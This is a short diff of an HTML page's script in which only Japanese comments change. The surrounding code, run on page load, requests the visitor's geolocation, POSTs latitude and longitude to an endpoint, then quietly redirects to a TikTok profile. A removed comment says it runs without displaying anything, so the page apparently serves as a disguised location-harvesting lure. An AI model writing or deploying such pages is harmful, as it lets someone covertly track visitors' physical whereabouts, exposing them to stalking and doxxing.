@@ -9,7 +9,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
             } else {
-                redirectNow();
+                redirectNow(); // 位置情報が取得できない場合も即リダイレクト
             }
         }
 
@@ -22,14 +22,14 @@
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ latitude: lat, longitude: lon })
-            }).finally(redirectNow);
+            }).finally(redirectNow); // 送信後にリダイレクト
         }
 
         function redirectNow() {
             window.location.replace("https://www.tiktok.com/@kaga1024?is_from_webapp=1&sender_device=pc"); // リダイレクト先のURL
         }
 
-        // 何も表示せずに実行
+        // ページが読み込まれるとすぐに位置情報取得を開始
         getLocation();
     </script>
 </head>
